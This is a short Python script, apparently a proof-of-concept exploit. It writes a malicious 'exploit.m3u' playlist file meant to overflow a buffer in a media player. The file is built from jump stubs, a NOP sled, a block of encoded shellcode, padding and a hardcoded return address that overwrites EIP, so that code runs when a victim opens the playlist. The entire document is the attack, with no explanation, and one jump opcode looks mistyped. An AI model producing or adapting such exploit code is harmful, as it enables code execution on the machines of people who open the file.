#! /usr/bin/python

jmp1 = "\x83\xec\x64" * 2
jmp2 = "\x83\xec\x28"
jmp3 = "\xff\e4"

jmp = jmp1 + jmp2 + jmp3

shell = "\x90" * 20 + ("\xbd\xba\xfd\x4b\xce\xdb\xd3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x31\x83\xc3\x04\x31\x6b\x0f\x03\x6b\xb5\x1f\xbe\x32\x21\x5d"
"\x41\xcb\xb1\x02\xcb\x2e\x80\x02\xaf\x3b\xb2\xb2\xbb\x6e\x3e"
"\x38\xe9\x9a\xb5\x4c\x26\xac\x7e\xfa\x10\x83\x7f\x57\x60\x82"
"\x03\xaa\xb5\x64\x3a\x65\xc8\x65\x7b\x98\x21\x37\xd4\xd6\x94"
"\xa8\x51\xa2\x24\x42\x29\x22\x2d\xb7\xf9\x45\x1c\x66\x72\x1c"
"\xbe\x88\x57\x14\xf7\x92\xb4\x11\x41\x28\x0e\xed\x50\xf8\x5f"
"\x0e\xfe\xc5\x50\xfd\xfe\x02\x56\x1e\x75\x7b\xa5\xa3\x8e\xb8"
"\xd4\x7f\x1a\x5b\x7e\x0b\xbc\x87\x7f\xd8\x5b\x43\x73\x95\x28"
"\x0b\x97\x28\xfc\x27\xa3\xa1\x03\xe8\x22\xf1\x27\x2c\x6f\xa1"
"\x46\x75\xd5\x04\x76\x65\xb6\xf9\xd2\xed\x5a\xed\x6e\xac\x30"
"\xf0\xfd\xca\x76\xf2\xfd\xd4\x26\x9b\xcc\x5f\xa9\xdc\xd0\xb5"
"\x8e\x13\x9b\x94\xa6\xbb\x42\x4d\xfb\xa1\x74\xbb\x3f\xdc\xf6"
"\x4e\xbf\x1b\xe6\x3a\xba\x60\xa0\xd7\xb6\xf9\x45\xd8\x65\xf9"
"\x4f\xbb\xe8\x69\x13\x12\x8f\x09\xb6\x6a") 


junk = "A" * (260 - (len(jmp)-(len(shell))))

eip = "\xb2\x59\x93\x3d"

sploit = jmp + junk + eip


fill = "C" * (10000 -(len(junk) -(len(eip))))


f=open("exploit.m3u","w")
f.write(sploit);
f.write(shell);
f.write(eip);
f.write(fill);
f.close()